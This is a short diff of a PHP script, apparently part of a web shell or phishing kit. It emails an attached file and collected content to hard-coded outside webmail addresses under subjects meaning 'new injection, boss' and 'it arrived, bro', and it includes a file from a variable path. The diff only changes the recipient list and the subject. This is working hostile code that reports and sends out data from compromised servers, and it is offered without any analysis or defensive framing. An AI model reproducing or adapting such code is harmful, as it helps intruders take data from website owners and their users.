@@ -685,8 +685,8 @@ filename=\"$file_name\"
 If ($file_name) $header.= "$content
 ";
 If ($file_name) $header.= "--$uid--";
-$to = ("rul3xand@gmail.com,tibiaspinal@hotmail.com,rul3xand@yahoo.com");
-$subject = ("injekan anyar Bos");
+$to = ("rul3xand@gmail.com,rul3xand@outlook.com,rul3xand@yahoo.com");
+$subject = ("Chegou mano");
 mail($to, $subject, $psn, $header);
 @include "$bn";;
 echo '  </table>
